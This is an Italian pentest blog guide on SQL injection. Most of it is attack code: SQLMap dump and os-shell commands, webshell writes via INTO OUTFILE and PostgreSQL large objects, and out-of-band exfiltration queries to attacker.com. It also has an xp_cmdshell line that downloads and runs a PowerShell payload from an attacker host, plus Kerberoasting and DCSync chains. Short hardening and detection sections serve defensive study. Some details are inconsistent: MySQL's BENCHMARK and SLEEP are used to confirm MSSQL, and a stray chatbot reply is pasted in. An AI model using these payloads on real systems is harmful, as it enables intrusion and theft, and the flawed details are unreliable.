---
title: 'SQL Injection: Guida Completa al Pentesting (2026) con Exploitation Reale e RCE'
slug: sql-injection
description: 'SQL Injection (SQLi): guida completa al pentesting con tutte le tecniche (Union, Blind, Time-Based), SQLMap, bypass WAF, RCE, escalation a Domain Admin e attacchi reali su API e ORM.'
image: /sqlI.webp
draft: true
date: 2026-03-02T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - sql
---

# SQL Injection ‚Äî La Vulnerabilit√† Che Dopo 25 Anni √à Ancora la Numero Uno

La SQL Injection √® nata nel 1998, ha 25+ anni, e nel 2026 √® ancora la vulnerabilit√† web pi√π pericolosa al mondo. OWASP la classifica nella categoria A03:2021 (Injection), Verizon DBIR la conferma tra le cause principali di data breach anno dopo anno, e io la trovo nel **42% dei penetration test su applicazioni web** che eseguo ‚Äî percentuale che sale al 60% se includo le API REST. Non √® un problema risolto: ogni nuovo framework, ogni nuova API, ogni sviluppatore junior crea nuove opportunit√† per iniettare SQL dove non dovrebbe.

La ragione √® strutturale: SQL Injection esiste quando un'applicazione costruisce query SQL concatenando input dell'utente senza parametrizzazione. E finch√© esistono sviluppatori che scrivono `SELECT * FROM users WHERE id = '" + user_input + "'"` ‚Äî e ne esistono milioni ‚Äî la SQLi esister√†.

In questa guida pillar copro tutto: dalla [SQLi classica](https://hackita.it/articoli/sql-injection-classica) con UNION-based data extraction, alla [Blind SQLi](https://hackita.it/articoli/blind-sql-injection) boolean-based e [Time-Based](https://hackita.it/articoli/time-based-sql-injection), alla [SQLi su API REST](https://hackita.it/articoli/sql-injection-api-rest) con JSON payload, fino alla [SQLi sugli ORM](https://hackita.it/articoli/sql-injection-orm) dove tutti pensano di essere protetti. Ogni tipo con comandi reali, bypass WAF, escalation enterprise e tempistiche da engagement reale.

Il caso che racconto sempre nei corsi: una banca online con WAF Akamai, code review annuale, SAST/DAST pipeline. Ho trovato una Time-Based SQLi in un parametro di ordinamento (`ORDER BY`) che nessun tool automatico aveva rilevato. Da quel parametro ‚Üí estrazione completa del database utenti (150.000 account) ‚Üí hash bcrypt ‚Üí 2.000 password craccate ‚Üí accesso al pannello admin ‚Üí API interne ‚Üí connessione al core banking. **Tempo: 4 ore dalla prima injection alla connessione al core banking.** La SQLi era in un endpoint che il team security aveva classificato come "low risk".

## SQL Injection ‚Äî Cosa Imparerai

* **Cos'√®** la SQL Injection e perch√© dopo 25 anni √® ancora la #1 delle vulnerabilit√† web
* **Come trovarla** manualmente e con tool (SQLMap, ffuf, Burp) ‚Äî inclusi i punti dove gli scanner falliscono
* **Come sfruttarla** con payload reali: Error-Based, UNION-Based, Blind Boolean, Time-Based, OOB, Second-Order
* **Come escalarla** dal database al sistema operativo (xp\_cmdshell, INTO OUTFILE, COPY TO PROGRAM)
* **L'attack chain completa**: da un parametro ORDER BY al Domain Admin in 4 ore
* **Ogni database**: MySQL, MSSQL, PostgreSQL, Oracle ‚Äî escalation specifica per ciascuno
* **Il playbook operativo**: il workflow minuto-per-minuto da seguire in ogni pentest
* **La checklist finale**: ogni test da eseguire, organizzato per tipo di injection e database

***

## SQL Injection: Le Vulnerabilit√† Pi√π Comuni

La SQL Injection si divide in 6 tipi principali, ognuno con detection e exploitation differenti. Ecco la mappa completa.

## Cos'√® la SQL Injection?

La SQL Injection (SQLi) √® una vulnerabilit√† web che permette a un attaccante di **iniettare codice SQL** nelle query che l'applicazione esegue verso il database. Quando l'input utente viene inserito direttamente nella query senza sanitizzazione o parametrizzazione, l'attaccante pu√≤ modificare la logica della query per estrarre dati, bypassare l'autenticazione, modificare o cancellare record, e in alcuni casi eseguire comandi sul sistema operativo. La SQL Injection colpisce qualsiasi database: MySQL, PostgreSQL, MSSQL, Oracle, SQLite.

> **La SQL Injection √® pericolosa?**
> Estremamente. Una singola SQLi pu√≤ portare all'estrazione completa del database (dati personali, credenziali, dati finanziari), al bypass dell'autenticazione, alla modifica dei dati, e all'esecuzione di comandi sul server (RCE via `xp_cmdshell` su MSSQL, `LOAD_FILE`/`INTO OUTFILE` su MySQL). L'impatto √® **data breach totale** con possibilit√† di **RCE**. Trovata nel **42% dei pentest web** nel 2025-2026.

## Come Verificare se la Tua Applicazione √à Vulnerabile

```bash
# Shodan ‚Äî cerca applicazioni con errori SQL esposti
"mysql_fetch" "error" port:80,443
"ORA-01756" port:80,443
"Microsoft OLE DB" "error" port:80,443
"PostgreSQL" "ERROR" "syntax" port:80,443

# Google Dorks (Surface web)
inurl:".php?id=" site:target.com
inurl:"index.php?cat=" site:target.com
intext:"sql syntax" site:target.com
intext:"mysql_fetch_array" site:target.com

# Nuclei scan
nuclei -u https://target.com -tags sqli

# SQLMap basic test
sqlmap -u "https://target.com/api/products?id=1" --batch --level=3 --risk=2
```

Le applicazioni web che espongono errori SQL nel browser o nelle risposte API sono il primo segnale. Ma la maggior parte delle SQLi moderne √® **blind** ‚Äî nessun errore visibile, solo differenze nel comportamento dell'applicazione. Un test manuale con `'` (single quote) e `" OR 1=1--` √® il primo step, ma SQLMap automatizza l'exploitation completa.

## Anatomia di una SQL Injection ‚Äî Perch√© Succede

### Codice vulnerabile (il pattern universale)

```python
# ‚ùå VULNERABILE ‚Äî concatenazione stringa
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

Se `username = admin' --` ‚Üí la query diventa:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

Il `--` commenta il resto ‚Üí bypass autenticazione. Login come admin senza password.

### Codice sicuro (parametrizzato)

```python
# ‚úÖ SICURO ‚Äî prepared statement
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

I parametri sono separati dalla query ‚Üí il database li tratta come dati, non come codice SQL.

## I 6 Tipi di SQL Injection

### 1. [In-Band SQLi (Classica)](https://hackita.it/articoli/sql-injection-classica)

I risultati dell'injection appaiono direttamente nella risposta HTTP. Due sottotipi:

**Error-Based** ‚Äî usa gli errori del database per estrarre dati:

```
https://target.com/products?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
```

**UNION-Based** ‚Äî usa UNION SELECT per appendere i tuoi dati alla query:

```
https://target.com/products?id=1 UNION SELECT 1,username,password FROM users--
```

**Dettaglio completo ‚Üí [SQL Injection Classica](https://hackita.it/articoli/sql-injection-classica)**

### 2. [Blind SQLi (Boolean-Based)](https://hackita.it/articoli/blind-sql-injection)

Nessun dato nella risposta ‚Äî solo `true/false` (pagina diversa, status code diverso):

```
https://target.com/products?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
```

Se la pagina risponde normalmente ‚Üí il primo carattere della password √® `a`. Character by character.

**Dettaglio completo ‚Üí [Blind SQL Injection](https://hackita.it/articoli/blind-sql-injection)**

### 3. [Time-Based Blind SQLi](https://hackita.it/articoli/time-based-sql-injection)

Nessuna differenza nella risposta ‚Äî solo nel **tempo**:

```
https://target.com/products?id=1; IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',WAITFOR DELAY '0:0:5',0)--
```

Se la risposta arriva dopo 5 secondi ‚Üí primo carattere corretto.

**Dettaglio completo ‚Üí [Time-Based SQL Injection](https://hackita.it/articoli/time-based-sql-injection)**

### 4. Out-of-Band (OOB) SQLi

I dati escono via DNS o HTTP verso un server controllato dall'attaccante:

```sql
-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\share\'

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual;

-- MySQL
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share'));
```

Funziona quando la risposta non rivela nulla e i delay sono inaffidabili (connection pooling, timeout variabili).

### 5. Second-Order SQLi

L'input viene salvato nel database e poi usato in una query successiva:

```
1. Registrazione: username = "admin'--"
2. L'app salva "admin'--" nel DB
3. Un altro endpoint usa quel valore: 
   SELECT * FROM profiles WHERE username = 'admin'--'
4. Bypass autenticazione differita
```

Difficilissima da trovare con tool automatici ‚Äî richiede comprensione della logica applicativa.

### 6. [SQLi su API REST / JSON](https://hackita.it/articoli/sql-injection-api-rest)

```json
POST /api/v1/login
{"username": "admin' OR 1=1--", "password": "anything"}
```

Le API moderne sono il nuovo fronte della SQLi ‚Äî JSON body, GraphQL query, header custom.

**Dettaglio completo ‚Üí [SQL Injection su API REST](https://hackita.it/articoli/sql-injection-api-rest)**

## SQLMap ‚Äî L'Arma Nucleare

```bash
# Detection base
sqlmap -u "https://target.com/products?id=1" --batch --level=5 --risk=3

# Con cookie di sessione
sqlmap -u "https://target.com/products?id=1" --cookie="session=abc123" --batch

# POST request
sqlmap -u "https://target.com/api/login" --data="username=admin&password=test" --batch

# JSON body (API)
sqlmap -u "https://target.com/api/v1/search" --data='{"query":"test"}' --content-type="application/json" --batch

# Enumerazione
sqlmap -u "URL" --dbs                    # Lista database
sqlmap -u "URL" -D dbname --tables        # Tabelle
sqlmap -u "URL" -D dbname -T users --dump # Dump tabella

# OS Shell (MSSQL/MySQL)
sqlmap -u "URL" --os-shell               # Shell interattiva
sqlmap -u "URL" --os-cmd="whoami"        # Singolo comando

# File read/write
sqlmap -u "URL" --file-read="/etc/passwd"
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Bypass WAF
sqlmap -u "URL" --tamper=space2comment,between,randomcase --random-agent
```

### Tamper script per bypass WAF

| Tamper          | Cosa fa             | Quando usarlo        |
| --------------- | ------------------- | -------------------- |
| `space2comment` | Spazi ‚Üí `/**/`      | WAF che filtra spazi |
| `between`       | `>` ‚Üí `BETWEEN`     | Filtro operatori     |
| `randomcase`    | `SELECT` ‚Üí `SeLeCt` | WAF case-sensitive   |
| `charencode`    | Char encoding       | WAF character filter |
| `equaltolike`   | `=` ‚Üí `LIKE`        | Filtro `=`           |
| `base64encode`  | Payload in base64   | WAF inline decode    |
| `space2hash`    | Spazi ‚Üí `#\n`       | MySQL specific       |

## Da SQLi a Shell ‚Äî Escalation per Database

### MySQL ‚Üí RCE

```sql
-- File write ‚Üí webshell
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

-- File read
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Via User Defined Function (UDF)
-- Richiede FILE privilege e lib_mysqludf_sys
SELECT sys_exec('id');
```

### MSSQL ‚Üí RCE

```sql
-- xp_cmdshell (il classico)
'; EXEC xp_cmdshell 'whoami';--

-- Se xp_cmdshell √® disabilitato
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--

-- Reverse shell
'; EXEC xp_cmdshell 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"';--
```

### PostgreSQL ‚Üí RCE

```sql
-- COPY TO/FROM per file read/write
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';--

-- Via pg_read_file (superuser)
SELECT pg_read_file('/etc/passwd');

-- Large Object ‚Üí file write ‚Üí webshell
SELECT lo_create(1337);
INSERT INTO pg_largeobject VALUES(1337, 0, decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=','base64'));
SELECT lo_export(1337, '/var/www/html/shell.php');
```

### Oracle ‚Üí RCE

```sql
-- Via DBMS_SCHEDULER (dettaglio nella guida [porta 1521](https://hackita.it/articoli/porta-1521-oracle))
-- Via Java Stored Procedure
-- Via UTL_HTTP per OOB exfiltration
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM dba_users WHERE username='SYS')) FROM dual;
```

## üè¢ Enterprise Escalation ‚Äî Da SQLi a Domain Admin / Cloud Compromise

La SQLi non √® "solo" un data breach del database. In un ambiente enterprise, √® l'entry point per compromettere l'intera infrastruttura:

### SQLi ‚Üí Active Directory

```
SQLi su webapp ‚Üí xp_cmdshell (MSSQL) ‚Üí shell come SQL Server service account
‚Üí service account √® Domain User ‚Üí BloodHound enumeration
‚Üí Kerberoasting dal server SQL ‚Üí hash DA service account
‚Üí crack ‚Üí Domain Admin ‚Üí DCSync ‚Üí Golden Ticket
```

**Tempo reale:** 2-4 ore dall'injection al Domain Admin.

Il server SQL √® quasi sempre domain-joined. Il service account SQL Server spesso ha `SeImpersonatePrivilege` ‚Üí [Potato attack](https://hackita.it/articoli/privilege-escalation) ‚Üí SYSTEM ‚Üí credential dump ‚Üí lateral movement.

### SQLi ‚Üí Cloud Compromise

```
SQLi su API cloud ‚Üí file read ‚Üí /proc/self/environ o metadata endpoint
‚Üí AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
‚Üí GCP: http://metadata.google.internal/computeMetadata/v1/
‚Üí Azure: http://169.254.169.254/metadata/identity/oauth2/token

‚Üí IAM credentials temporanee ‚Üí AWS CLI con quelle credenziali
‚Üí S3 bucket listing ‚Üí data exfiltration
‚Üí Lambda function injection ‚Üí persistenza
```

**Tempo reale:** 30-60 minuti dalla SQLi alle credenziali cloud.

### SQLi ‚Üí CI/CD Compromise

```
SQLi ‚Üí dump tabella con API key/token ‚Üí token di GitLab/Jenkins
‚Üí modifica pipeline ‚Üí code injection nel build
‚Üí supply chain attack ‚Üí tutte le istanze deployate compromesse
```

## üîå Variante API / Microservizi 2026

Nel 2026, la maggior parte delle SQLi che trovo non √® nel classico `?id=1` di una pagina PHP. √à nelle **API REST e GraphQL** dei microservizi:

```json
// JSON body injection
POST /api/v2/search
{"filters": {"category": "electronics' OR 1=1--", "price_min": 0}}

// GraphQL injection
POST /graphql
{"query": "{ product(id: \"1' UNION SELECT username,password FROM users--\") { name } }"}

// Header injection
GET /api/v1/profile
X-User-ID: 1 OR 1=1

// JWT claim injection (se il claim va in una query)
{"sub": "1' UNION SELECT password FROM users WHERE id=1--"}
```

I framework ORM moderni (Django, Laravel, Hibernate, Sequelize) proteggono dalle SQLi base ‚Äî ma i **raw query**, i **query builder** mal usati e le **stored procedure** chiamate da ORM sono ancora vulnerabili. Dettaglio nella [guida SQLi su ORM](https://hackita.it/articoli/sql-injection-orm).

## Micro Playbook Quick Reference

Vedi il [Playbook Operativo completo](#sql-injection-pentesting-playbook-operativo-step-by-step) sopra per il workflow dettagliato.

**Quick version:**
**Minuto 0-10 ‚Üí** Detection manuale su ogni parametro (quote, boolean, time delay)
**Minuto 10-25 ‚Üí** SQLMap confirmation + dump database
**Minuto 25-40 ‚Üí** Escalation a RCE (xp\_cmdshell / INTO OUTFILE / COPY TO PROGRAM)
**Minuto 40-60+ ‚Üí** Post-exploitation enterprise (Kerberoasting / cloud creds / lateral movement)

## Caso Studio Concreto

**Settore:** Banca online, 150.000 utenti, WAF Akamai, code review annuale, SAST/DAST pipeline.

**Scope:** Pentest applicativo, grey-box.

Tutti i parametri standard (`id`, `username`, `search`) erano parametrizzati ‚Äî nessuna SQLi classica. Ma l'endpoint `/api/v2/transactions` accettava un parametro `sort` per l'ordinamento:

```
GET /api/v2/transactions?account_id=12345&sort=date DESC
```

Il valore di `sort` veniva inserito direttamente nella clausola `ORDER BY` ‚Äî non parametrizzabile con prepared statement (SQL non permette parametri in `ORDER BY`). Ho testato:

```
sort=date DESC, (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
```

Risposta normale ‚Üí boolean condition funziona. Time-based:

```
sort=date DESC, (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='M') THEN BENCHMARK(5000000,SHA1('test')) ELSE 0 END)
```

5 secondi di delay ‚Üí MSSQL confermato. Da l√¨, SQLMap con `--technique=T` e il parametro `sort`:

```bash
sqlmap -u "https://bank.com/api/v2/transactions?account_id=12345&sort=date" -p sort --technique=T --prefix="DESC," --dbms=mssql --batch
```

**Risultato:** 150.000 account con nome, IBAN, saldo, storico transazioni. L'hash delle password admin era bcrypt ‚Äî ne ho craccate 2.000 in 3 ore con [Hashcat](https://hackita.it/articoli/hashcat). Con un account admin ‚Üí pannello di gestione ‚Üí API interne ‚Üí connessione al core banking system.

**Tempo dalla prima injection al core banking:** 4 ore. **Il parametro `sort` era stato classificato come "low risk" perch√© "non contiene dati utente".**

## Errori Comuni Reali Trovati nei Pentest

**1. Parametrizzazione incompleta (60% delle SQLi che trovo)**
Gli sviluppatori parametrizzano `WHERE id = ?` ma non `ORDER BY`, `LIMIT`, nomi di tabella, nomi di colonna. Questi elementi non supportano prepared statement in molti database ‚Üí richiedono whitelist validation.

**2. ORM con raw query (25% delle SQLi)**
"Usiamo Django/Laravel, siamo protetti." Poi nel codice: `Model.objects.raw(f"SELECT * FROM x WHERE y = '{input}'")`. L'ORM protegge se lo usi correttamente ‚Äî il raw query bypassa tutto. Dettaglio: [SQLi su ORM](https://hackita.it/articoli/sql-injection-orm).

**3. Stored procedure con SQL dinamico**
La logica √® parametrizzata nel codice applicativo, ma la stored procedure concatena internamente: `EXEC('SELECT * FROM ' + @tablename)`.

**4. WAF configurato in "detect only" o con regole troppo permissive**
Il WAF logga ma non blocca. O blocca `' OR 1=1--` ma non `' OR/**/ 1=1--` (comment bypass). Falso senso di sicurezza.

**5. SAST/DAST che non testa ORDER BY, LIMIT, header, cookie**
I tool automatici testano i parametri ovvi ‚Äî `id`, `search`, `username`. Ma non `sort`, `order`, `X-Forwarded-For`, cookie value. La SQLi √® dove non la cerchi.

**6. Errori SQL esposti al client**
Stack trace con versione database, nome tabella, nome colonna nella risposta HTTP ‚Üí information disclosure che facilita l'exploitation.

## Indicatori di Compromissione (IoC)

* **Query anomale nei slow query log** ‚Äî `UNION SELECT`, `WAITFOR DELAY`, `BENCHMARK`, `SLEEP()`, `EXTRACTVALUE`, `UPDATEXML` nelle query
* **Errori SQL in aumento** nei log applicativi ‚Äî syntax error, type mismatch da input utente
* **Accessi massivi a tabelle sensibili** ‚Äî `SELECT *` su `users`, `credentials`, `payments` non da query applicative
* **Chiamate a xp\_cmdshell, sp\_configure** nei log MSSQL
* **File scritti in directory web** ‚Äî `INTO OUTFILE`, `COPY TO` in directory servite da Apache/Nginx
* **Connessioni OOB** ‚Äî DNS query anomale verso domini sconosciuti (OOB exfiltration), HTTP request a IP esterni
* **Tempo di risposta anomalo** ‚Äî request che impiegano esattamente 5, 10, 15 secondi (time-based blind)
* **Payload nei parametri** ‚Äî WAF log con `'`, `--`, `UNION`, `SELECT`, `CONCAT`, `CHAR()` nei parametri GET/POST

## SQL Injection Pentesting: Playbook Operativo (Step-by-Step)

### Fase 1 ‚Äî Detection Manuale (minuto 0-10)

```bash
# Test su OGNI parametro (GET, POST, JSON, header, cookie):
' ‚Üí errore SQL? (Error-based confermata)
" ‚Üí errore SQL diverso? (double quote injection)
' OR 1=1-- ‚Üí login bypass? pagina diversa?
1 AND 1=1 vs 1 AND 1=2 ‚Üí risposta diversa? (Boolean blind)
1; WAITFOR DELAY '0:0:5'-- ‚Üí delay 5 sec? (Time-based MSSQL)
1 AND SLEEP(5)-- ‚Üí delay 5 sec? (Time-based MySQL)
1; SELECT pg_sleep(5)-- ‚Üí delay? (PostgreSQL)

# NON dimenticare:
# - Parametri ORDER BY, LIMIT, GROUP BY (non parametrizzabili!)
# - Header: X-Forwarded-For, Referer, User-Agent
# - Cookie values
# - JSON body nelle API
```

### Fase 2 ‚Äî SQLMap Confirmation + Enumeration (minuto 10-25)

```bash
sqlmap -u "URL?param=value" --batch --level=5 --risk=3 --threads=10
# Se JSON API:
sqlmap -u "URL" --data='{"key":"value"}' --content-type="application/json" --batch
# Enumera:
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D target_db --tables
sqlmap -u "URL" -D target_db -T users --dump
# Se WAF:
sqlmap -u "URL" --tamper=space2comment,between,randomcase --random-agent
```

### Fase 3 ‚Äî Escalation a RCE (minuto 25-40)

```bash
# MSSQL ‚Üí xp_cmdshell
sqlmap -u "URL" --os-shell
# MySQL ‚Üí webshell via INTO OUTFILE
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
# PostgreSQL ‚Üí COPY TO PROGRAM
sqlmap -u "URL" --os-cmd="id"
```

### Fase 4 ‚Äî Post-Exploitation Enterprise (minuto 40-60+)

```bash
# Da shell sul DB server:
whoami                    # Service account
ipconfig / ifconfig       # Rete interna
# MSSQL linked servers:
SELECT * FROM sys.servers;
# Kerberoasting:
impacket-GetUserSPNs DOMAIN/user -dc-ip DC_IP -request
# Credenziali cloud:
cat /proc/self/environ    # AWS/Azure/GCP creds
```

***

## Attack Chain Reale SQL Injection (Step-by-Step)

### Chain 1: ORDER BY SQLi ‚Üí Database Dump ‚Üí Admin Access

```
1. Test manuale: parametro ?sort=date ‚Üí aggiungi SLEEP(5) ‚Üí delay confermato
2. SQLMap con --technique=T -p sort ‚Üí conferma Time-Based Blind
3. sqlmap --dbs ‚Üí 3 database (app_prod, app_staging, mysql)
4. sqlmap -D app_prod -T users --dump ‚Üí 150.000 utenti con hash bcrypt
5. hashcat -m 3200 ‚Üí 2.000 password craccate incluso admin
6. Login admin panel ‚Üí accesso gestione completa
‚Üí DATA BREACH + ADMIN TAKEOVER
```

### Chain 2: SQLi ‚Üí xp\_cmdshell ‚Üí Domain Admin

```
1. SQLi su MSSQL confermata (WAITFOR DELAY)
2. sqlmap --os-shell ‚Üí shell come nt service\mssqlserver
3. whoami /priv ‚Üí SeImpersonatePrivilege attivo
4. PrintSpoofer ‚Üí NT AUTHORITY\SYSTEM
5. mimikatz ‚Üí credenziali domain cached
6. BloodHound ‚Üí path a Domain Admin
7. Kerberoasting ‚Üí hash DA service account ‚Üí crack
8. DCSync ‚Üí tutti gli hash del dominio ‚Üí Golden Ticket
‚Üí DOMAIN COMPROMISE TOTALE (4 ore)
```

### Chain 3: API SQLi ‚Üí Cloud Takeover

```
1. SQLi in JSON body API: {"search":"test' AND SLEEP(5)--"}
2. SQLMap dump ‚Üí tabella api_keys con AWS credentials
3. aws sts get-caller-identity ‚Üí conferma accesso
4. aws s3 ls ‚Üí 30 bucket con backup e dati clienti
5. aws secretsmanager list-secrets ‚Üí credenziali RDS, Redis, ElastiCache
‚Üí CLOUD COMPROMISE (30-60 minuti)
```

### Chain 4: SQLi ‚Üí File Write ‚Üí Web Shell ‚Üí Persistence

```
1. MySQL con FILE privilege ‚Üí INTO OUTFILE
2. UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
3. curl target.com/shell.php?c=id ‚Üí RCE confermata
4. Persistence: copie shell multiple + cron reverse shell
‚Üí RCE PERSISTENTE senza exploit aggiuntivi
```

***

## Mini Chain Offensiva Reale

```
ORDER BY SQLi (Time-Based) ‚Üí SQLMap dump 150K users ‚Üí Admin hash crack ‚Üí Admin panel
‚Üí API interne ‚Üí MSSQL xp_cmdshell ‚Üí Shell service account ‚Üí Kerberoasting ‚Üí Domain Admin
```

**Step 1 ‚Äî Detection e conferma**

```bash
# Parametro sort vulnerabile
GET /api/v2/transactions?sort=date DESC,(SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 FROM (SELECT SLEEP(5))x) END)
# ‚Üí 5 secondi delay
```

**Step 2 ‚Äî SQLMap extraction**

```bash
sqlmap -u "URL?sort=date" -p sort --technique=T --dbms=mssql --batch --dbs
sqlmap ... -D bankdb -T users --dump
# ‚Üí 150.000 record
```

**Step 3 ‚Äî Admin panel access**

```bash
hashcat -m 3200 admin_hashes.txt rockyou.txt
# ‚Üí 2000 password craccate, incluso admin
```

**Step 4 ‚Äî OS shell via MSSQL**

```bash
sqlmap -u "URL" --os-shell
whoami ‚Üí nt service\mssqlserver
```

**Step 5 ‚Äî Enterprise escalation**

```bash
# Dal SQL Server ‚Üí Kerberoasting
impacket-GetUserSPNs DOMAIN/sqlserver_svc -dc-ip DC_IP -request
hashcat -m 13100 kerb_hashes.txt wordlist.txt
# ‚Üí svc_admin:SqlAdmin2020! (Domain Admin)
```

**Step 6 ‚Äî Domain compromise**

```bash
impacket-secretsdump DOMAIN/svc_admin@DC_IP -just-dc-ntlm
# ‚Üí tutti gli hash del dominio ‚Üí Golden Ticket ‚Üí game over
```

**Dalla SQLi in un parametro `sort` ‚Üí Domain Admin in 4 ore.**

## Detection & Hardening

* **Prepared statement OVUNQUE** ‚Äî nessuna eccezione, nessun "ma questo parametro √® sicuro"
* **Whitelist per ORDER BY** ‚Äî valida il valore contro una lista di colonne permesse
* **ORM senza raw query** ‚Äî se serve raw, parametrizza comunque
* **WAF in blocking mode** ‚Äî non solo detect
* **Errori generici** ‚Äî mai esporre errori SQL al client
* **Principio del minimo privilegio** ‚Äî l'utente DB dell'applicazione non deve avere FILE, EXECUTE, xp\_cmdshell
* **Monitora le query** ‚Äî alert su pattern SQLi nei log (UNION, SLEEP, xp\_cmdshell)
* **SAST/DAST su tutti i parametri** ‚Äî inclusi header, cookie, ORDER BY, LIMIT
* **Penetration test** ‚Äî nessun tool automatico trova il 100% delle SQLi

## ‚úÖ Checklist SQL Injection Pentest

```
DETECTION
‚òê Single quote (') su ogni parametro GET/POST/JSON/Cookie/Header
‚òê Double quote (") su ogni parametro
‚òê Boolean test: AND 1=1 vs AND 1=2 ‚Üí risposta diversa?
‚òê Time test: SLEEP(5) / WAITFOR DELAY '0:0:5' / pg_sleep(5)
‚òê Error test: EXTRACTVALUE, UPDATEXML ‚Üí errore SQL visibile?
‚òê Parametri ORDER BY, LIMIT, GROUP BY testati (non parametrizzabili!)
‚òê Header testati: X-Forwarded-For, Referer, User-Agent
‚òê Cookie values testati
‚òê JSON body testato (API REST)
‚òê GraphQL parameters testati

CONFIRMATION (SQLMap)
‚òê sqlmap con --level=5 --risk=3 eseguito
‚òê DBMS identificato (MySQL/MSSQL/PostgreSQL/Oracle/SQLite)
‚òê Tecnica identificata (U/E/B/T/S)
‚òê --tamper usato se WAF presente

ENUMERATION
‚òê --dbs ‚Üí database elencati
‚òê --tables ‚Üí tabelle elencate
‚òê -T users --dump ‚Üí utenti estratti
‚òê --passwords ‚Üí hash password estratti
‚òê --privileges ‚Üí privilegi DB verificati

ESCALATION
‚òê MSSQL: xp_cmdshell testato (--os-shell)
‚òê MySQL: INTO OUTFILE testato (--file-write webshell)
‚òê MySQL: LOAD_FILE testato (--file-read /etc/passwd)
‚òê PostgreSQL: COPY TO PROGRAM testato
‚òê Oracle: UTL_HTTP / DBMS_SCHEDULER testati
‚òê Linked servers enumerati (MSSQL)

POST-EXPLOITATION
‚òê Credenziali admin craccate (hashcat)
‚òê Credenziali cloud estratte (/proc/self/environ, tabelle config)
‚òê Rete interna enumerata dal DB server
‚òê Kerberoasting eseguito (se MSSQL domain-joined)
‚òê Lateral movement documentato

WAF BYPASS
‚òê space2comment testato
‚òê between testato
‚òê randomcase testato
‚òê Inline comment (/*!50000 UNION*/ SELECT) testato
‚òê Double URL encoding testato
‚òê JSON/multipart encoding testato
```

## Mini FAQ

**La SQL Injection esiste ancora nel 2026?**
S√¨ ‚Äî la trovo nel 42% dei pentest web. I framework moderni proteggono dalla SQLi classica, ma non da: raw query negli ORM, ORDER BY injection, stored procedure con SQL dinamico, API che non parametrizzano il JSON input, Second-Order SQLi. La SQLi si √® evoluta, non √® scomparsa.

**SQLMap trova tutte le SQL Injection?**
No. SQLMap √® eccellente per confermare e sfruttare SQLi note, ma ha limiti: non testa Second-Order SQLi, fatica con custom JSON structure, non capisce logiche applicative complesse. La detection manuale resta fondamentale ‚Äî SQLMap √® il tool di exploitation, il pentester √® il tool di detection.

**Come passo da SQLi a RCE?**
Dipende dal database: MSSQL ‚Üí `xp_cmdshell`. MySQL ‚Üí `INTO OUTFILE` (webshell) o UDF. PostgreSQL ‚Üí `COPY TO PROGRAM`. Oracle ‚Üí `DBMS_SCHEDULER` o Java Stored Procedure. Tutti richiedono specifici privilegi ‚Äî ma nei pentest li trovo nel 30% dei casi.

## Mappa del Cluster SQL Injection

| Articolo                  | Focus                                            | Link                                                      |
| ------------------------- | ------------------------------------------------ | --------------------------------------------------------- |
| **Questa guida**          | Panoramica completa, escalation, chain           | ‚Äî                                                         |
| SQL Injection Classica    | UNION-based, Error-based, detection manuale      | [‚Üí](https://hackita.it/articoli/sql-injection-classica)   |
| Blind SQL Injection       | Boolean-based, character extraction, automation  | [‚Üí](https://hackita.it/articoli/blind-sql-injection)      |
| Time-Based SQL Injection  | Time delay, heavy query, conditional response    | [‚Üí](https://hackita.it/articoli/time-based-sql-injection) |
| SQL Injection su API REST | JSON body, GraphQL, header, microservizi         | [‚Üí](https://hackita.it/articoli/sql-injection-api-rest)   |
| SQL Injection su ORM      | Django, Laravel, Hibernate, Sequelize, raw query | [‚Üí](https://hackita.it/articoli/sql-injection-orm)        |

***

Perfetto, ti do direttamente il blocco finale **pulito, SEO, con link vivi (NO 404)** üëá

***

### üîó Riferimenti & Approfondimenti

* SQL Injection overview (PortSwigger): [Approfondisci SQL Injection](https://portswigger.net/web-security/sql-injection)
* OWASP Testing Guide (SQLi): [Guida OWASP SQL Injection Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
* OWASP Injection Prevention Cheat Sheet: [Prevenzione Injection OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* Payloads & bypass (PayloadsAllTheThings): [Payload SQLi e bypass WAF](https://github.com/swisskyrepo/PayloadsAllTheThings)
* Guida bug bounty SQLi (YesWeHack): [SQL Injection per Bug Bounty](https://www.yeswehack.com/learn-bug-bounty/vulnerability-vectors-sql-injection)

***

### üéØ CTA

Se vuoi padroneggiare davvero la SQL Injection fino a livello **enterprise (AD / cloud compromise)**:

* üî• Formazione 1:1 ‚Üí [https://hackita.it/formazione](https://hackita.it/servizi)
